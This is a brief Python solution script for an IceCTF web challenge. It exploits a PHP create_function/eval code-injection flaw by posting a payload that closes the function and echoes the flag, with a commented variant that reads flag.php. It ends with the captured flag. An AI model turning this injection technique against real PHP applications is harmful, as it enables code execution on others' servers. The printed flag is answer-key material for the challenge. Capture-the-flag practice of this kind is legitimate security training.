import requests

'''
I figured the "create_function" was vulnerable and indeed it was. 
It essentially runs eval() which is obviously exploitable... 
Check out the links below for more information: 

https://cxsecurity.com/issue/WLB-2008090063
https://www.exploit-db.com/exploits/32417
'''

def cleanhtml(raw_html): # https://stackoverflow.com/questions/9662346/python-code-to-remove-html-tags-from-a-string
  import re
  cleanr = re.compile('<.*?>|&([a-z0-9]+|#[0-9]{1,6}|#x[0-9a-f]{1,6});')
  cleantext = re.sub(cleanr, '', raw_html)
  return cleantext

# payload = { "c" : 'return -1;}readfile("flag.php");/*'}
payload = { "c" : 'return -1;}echo($flag);/*'}
r = requests.post("http://www.web-creat.vuln.icec.tf/index.php", data=payload)

print(cleanhtml(r.text))

# flag: IceCTF{Code_injection_in_php_because_why_n0t}
